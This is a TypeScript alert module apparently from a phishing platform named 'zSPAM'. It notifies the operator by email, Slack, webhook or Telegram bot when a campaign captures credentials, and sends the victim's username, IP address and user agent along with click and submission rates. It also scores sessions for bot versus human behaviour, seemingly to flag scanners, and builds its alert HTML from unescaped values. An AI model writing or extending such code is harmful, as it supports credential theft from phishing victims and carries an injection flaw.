import { db } from '../db';
import { alertSettings } from '@shared/schema';
import { eq } from 'drizzle-orm';

interface AlertData {
  title: string;
  message: string;
  type: 'info' | 'success' | 'warning' | 'error';
  campaignId?: string;
  sessionId?: string;
  userId?: string;
  metadata?: Record<string, any>;
}

interface CampaignStats {
  totalRecipients: number;
  sentCount: number;
  failedCount: number;
}

export class AlertService {
  // Send credential capture alert
  async sendCredentialCaptureAlert(session: any, campaign: any) {
    const alertData: AlertData = {
      title: '🔴 Credentials Captured',
      message: `New credentials captured in campaign "${campaign.name}"`,
      type: 'warning',
      campaignId: campaign.id,
      sessionId: session.id,
      metadata: {
        username: session.username,
        ipAddress: session.ipAddress,
        userAgent: session.userAgent,
        campaignType: campaign.type,
        captureTime: new Date().toISOString()
      }
    };

    await this.sendAlert(campaign.userId, alertData);
  }

  // Send campaign start alert
  async sendCampaignStartAlert(campaign: any, stats: CampaignStats) {
    const alertData: AlertData = {
      title: '🚀 Campaign Started',
      message: `Campaign "${campaign.name}" has been launched successfully`,
      type: 'success',
      campaignId: campaign.id,
      metadata: {
        campaignType: campaign.type,
        totalRecipients: stats.totalRecipients,
        sentCount: stats.sentCount,
        failedCount: stats.failedCount,
        successRate: ((stats.sentCount / stats.totalRecipients) * 100).toFixed(1) + '%',
        startTime: new Date().toISOString()
      }
    };

    await this.sendAlert(campaign.userId, alertData);
  }

  // Send campaign end alert
  async sendCampaignEndAlert(campaign: any, finalStats: any) {
    const alertData: AlertData = {
      title: '📊 Campaign Completed',
      message: `Campaign "${campaign.name}" has completed`,
      type: 'info',
      campaignId: campaign.id,
      metadata: {
        campaignType: campaign.type,
        duration: this.calculateDuration(campaign.createdAt, new Date()),
        totalRecipients: finalStats.totalRecipients,
        emailsOpened: finalStats.emailsOpened,
        linksClicked: finalStats.linksClicked,
        credentialsSubmitted: finalStats.credentialsSubmitted,
        clickRate: ((finalStats.linksClicked / finalStats.totalRecipients) * 100).toFixed(1) + '%',
        submissionRate: ((finalStats.credentialsSubmitted / finalStats.totalRecipients) * 100).toFixed(1) + '%',
        endTime: new Date().toISOString()
      }
    };

    await this.sendAlert(campaign.userId, alertData);
  }

  // Send high-risk session alert
  async sendHighRiskSessionAlert(session: any, campaign: any) {
    const alertData: AlertData = {
      title: '⚠️ High-Risk Session Detected',
      message: `Suspicious activity detected in campaign "${campaign.name}"`,
      type: 'warning',
      campaignId: campaign.id,
      sessionId: session.id,
      metadata: {
        riskLevel: session.riskLevel,
        botScore: session.botScore,
        humanScore: session.humanScore,
        suspiciousFactors: this.analyzeSuspiciousFactors(session),
        ipAddress: session.ipAddress,
        userAgent: session.userAgent,
        detectionTime: new Date().toISOString()
      }
    };

    await this.sendAlert(campaign.userId, alertData);
  }

  // Main alert sending function
  private async sendAlert(userId: string, alertData: AlertData) {
    try {
      // Get user's alert settings
      const userAlerts = await db.select()
        .from(alertSettings)
        .where(eq(alertSettings.userId, userId))
        .limit(1);

      if (!userAlerts.length) {
        // Create default alert settings if none exist
        await this.createDefaultAlertSettings(userId);
        return;
      }

      const settings = userAlerts[0];

      // Send alerts based on user preferences
      const promises: Promise<any>[] = [];

      if (settings.emailEnabled && settings.emailAddress) {
        promises.push(this.sendEmailAlert(settings.emailAddress, alertData));
      }

      if (settings.slackEnabled && settings.slackWebhookUrl) {
        promises.push(this.sendSlackAlert(settings.slackWebhookUrl, settings.slackChannel, alertData));
      }

      if (settings.telegramEnabled && settings.telegramBotToken && settings.telegramChatId) {
        promises.push(this.sendTelegramAlert(
          settings.telegramBotToken,
          settings.telegramChatId,
          alertData
        ));
      }

      if (settings.webhookEnabled && settings.webhookUrl) {
        promises.push(this.sendWebhookAlert(settings.webhookUrl, settings.webhookSecret, alertData));
      }

      // Execute all alerts concurrently
      await Promise.allSettled(promises);
    } catch (error) {
      console.error('Failed to send alert:', error);
    }
  }

  // Send email alert
  private async sendEmailAlert(emailAddress: string, alertData: AlertData) {
    try {
      // Import email sending functionality
      const { sendEmail } = await import('./emailSender');
      
      const subject = `zSPAM Alert: ${alertData.title}`;
      const htmlContent = this.generateEmailAlertContent(alertData);
      
      await sendEmail({
        to: emailAddress,
        subject,
        html: htmlContent,
        text: this.stripHtml(htmlContent)
      });
    } catch (error) {
      console.error('Failed to send email alert:', error);
    }
  }

  // Send Slack alert
  private async sendSlackAlert(webhookUrl: string, channel: string | null, alertData: AlertData) {
    try {
      const payload = {
        channel: channel || '#general',
        username: 'zSPAM Bot',
        icon_emoji: this.getSlackEmoji(alertData.type),
        attachments: [{
          color: this.getSlackColor(alertData.type),
          title: alertData.title,
          text: alertData.message,
          fields: this.formatMetadataForSlack(alertData.metadata),
          timestamp: Math.floor(Date.now() / 1000)
        }]
      };

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        throw new Error(`Slack webhook failed: ${response.statusText}`);
      }
    } catch (error) {
      console.error('Failed to send Slack alert:', error);
    }
  }

  // Send Telegram alert
  private async sendTelegramAlert(botToken: string, chatId: string, alertData: AlertData) {
    try {
      const message = this.formatTelegramMessage(alertData);
      
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        })
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Telegram API error: ${error.description}`);
      }
    } catch (error) {
      console.error('Failed to send Telegram alert:', error);
    }
  }

  // Send webhook alert
  private async sendWebhookAlert(webhookUrl: string, webhookSecret: string | null, alertData: AlertData) {
    try {
      const payload = {
        timestamp: new Date().toISOString(),
        event: alertData.type,
        data: alertData
      };

      const headers: Record<string, string> = {
        'Content-Type': 'application/json',
        'X-zSPAM-Event': alertData.type
      };

      // Add signature if secret is provided
      if (webhookSecret) {
        const crypto = require('crypto');
        const signature = crypto
          .createHmac('sha256', webhookSecret)
          .update(JSON.stringify(payload))
          .digest('hex');
        headers['X-zSPAM-Signature'] = `sha256=${signature}`;
      }

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers,
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        throw new Error(`Webhook failed: ${response.statusText}`);
      }
    } catch (error) {
      console.error('Failed to send webhook alert:', error);
    }
  }

  // Create default alert settings for new users
  private async createDefaultAlertSettings(userId: string) {
    await db.insert(alertSettings).values({
      userId,
      emailEnabled: true,
      alertOnCredentialCapture: true,
      alertOnCampaignStart: true,
      alertOnCampaignEnd: true,
      alertOnHighRiskSession: true
    });
  }

  // Helper functions
  private calculateDuration(startTime: Date, endTime: Date): string {
    const diff = endTime.getTime() - startTime.getTime();
    const hours = Math.floor(diff / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    return `${hours}h ${minutes}m`;
  }

  private analyzeSuspiciousFactors(session: any): string[] {
    const factors: string[] = [];
    
    if (session.botScore > 70) factors.push('High bot score');
    if (session.humanScore < 30) factors.push('Low human score');
    if (!session.userAgent) factors.push('Missing user agent');
    if (session.timeOnPage < 5) factors.push('Suspiciously fast interaction');
    
    return factors;
  }

  private generateEmailAlertContent(alertData: AlertData): string {
    return `
      <html>
        <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
          <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
            <div style="background: ${this.getEmailColor(alertData.type)}; color: white; padding: 20px; border-radius: 8px 8px 0 0;">
              <h1 style="margin: 0; font-size: 24px;">${alertData.title}</h1>
            </div>
            <div style="background: #f9f9f9; padding: 20px; border-radius: 0 0 8px 8px; border: 1px solid #ddd;">
              <p style="font-size: 16px; margin-bottom: 20px;">${alertData.message}</p>
              
              ${alertData.metadata ? `
                <h3>Details:</h3>
                <ul style="list-style: none; padding: 0;">
                  ${Object.entries(alertData.metadata).map(([key, value]) => 
                    `<li style="margin-bottom: 8px;"><strong>${this.formatKey(key)}:</strong> ${value}</li>`
                  ).join('')}
                </ul>
              ` : ''}
              
              <p style="margin-top: 30px; font-size: 14px; color: #666;">
                This alert was generated by zSPAM at ${new Date().toLocaleString()}
              </p>
            </div>
          </div>
        </body>
      </html>
    `;
  }

  private formatTelegramMessage(alertData: AlertData): string {
    let message = `*${alertData.title}*\n\n${alertData.message}\n`;
    
    if (alertData.metadata) {
      message += '\n*Details:*\n';
      for (const [key, value] of Object.entries(alertData.metadata)) {
        message += `• *${this.formatKey(key)}:* ${value}\n`;
      }
    }
    
    message += `\n_Alert generated at ${new Date().toLocaleString()}_`;
    return message;
  }

  private formatMetadataForSlack(metadata?: Record<string, any>) {
    if (!metadata) return [];
    
    return Object.entries(metadata).map(([key, value]) => ({
      title: this.formatKey(key),
      value: String(value),
      short: true
    }));
  }

  private formatKey(key: string): string {
    return key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
  }

  private getSlackEmoji(type: string): string {
    const emojis = {
      info: ':information_source:',
      success: ':white_check_mark:',
      warning: ':warning:',
      error: ':x:'
    };
    return emojis[type as keyof typeof emojis] || ':bell:';
  }

  private getSlackColor(type: string): string {
    const colors = {
      info: '#36a64f',
      success: '#2eb886',
      warning: '#ff9500',
      error: '#e01e5a'
    };
    return colors[type as keyof typeof colors] || '#cccccc';
  }

  private getEmailColor(type: string): string {
    const colors = {
      info: '#3498db',
      success: '#2ecc71',
      warning: '#f39c12',
      error: '#e74c3c'
    };
    return colors[type as keyof typeof colors] || '#95a5a6';
  }

  private stripHtml(html: string): string {
    return html.replace(/<[^>]*>/g, '').replace(/&nbsp;/g, ' ');
  }
}

// Export singleton instance
export const alertService = new AlertService();